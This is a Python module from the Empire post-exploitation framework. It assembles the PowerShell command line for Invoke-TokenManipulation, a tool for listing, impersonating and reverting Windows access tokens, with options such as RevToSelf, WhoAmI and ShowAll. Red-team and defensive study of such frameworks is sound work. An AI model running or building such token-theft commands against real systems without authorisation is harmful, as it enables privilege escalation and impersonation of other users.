from empire.server.common.empire import MainMenu
from empire.server.core.module_models import EmpireModule
from empire.server.core.module_service import auto_finalize, auto_get_source


class Module:
    @staticmethod
    @auto_get_source
    @auto_finalize
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
        script: str = "",
    ):

        script_end = "Invoke-TokenManipulation"

        outputf = params.get("OutputFunction", "Out-String")

        if params["RevToSelf"].lower() == "true":
            script_end += " -RevToSelf"
        elif params["WhoAmI"].lower() == "true":
            script_end += " -WhoAmI"
        elif params["ShowAll"].lower() == "true":
            script_end += " -ShowAll"
            script_end += (
                f" | {outputf} | "
                + '%{$_ + "`n"};"`n'
                + str(module.name.split("/")[-1])
                + ' completed!"'
            )
        else:
            for option, values in params.items():
                if (
                    option.lower() != "agent"
                    and option.lower() != "outputfunction"
                    and values
                    and values != ""
                ):
                    if values.lower() == "true":
                        # if we're just adding a switch
                        script_end += " -" + str(option)
                    else:
                        script_end += " -" + str(option) + " " + str(values)

            # try to make the output look nice
            if script.endswith("Invoke-TokenManipulation") or script.endswith(
                "-ShowAll"
            ):
                script_end += "| Select-Object Domain, Username, ProcessId, IsElevated, TokenType | ft -autosize"
                script_end += (
                    f" | {outputf} | "
                    + '%{$_ + "`n"};"`n'
                    + str(module.name.split("/")[-1])
                    + ' completed!"'
                )
            else:
                script_end += (
                    f" | {outputf} | "
                    + '%{$_ + "`n"};"`n'
                    + str(module.name.split("/")[-1])
                    + ' completed!"'
                )
                if params["RevToSelf"].lower() != "true":
                    script_end += ';"`nUse credentials/tokens with RevToSelf option to revert token privileges"'

        return script, script_end
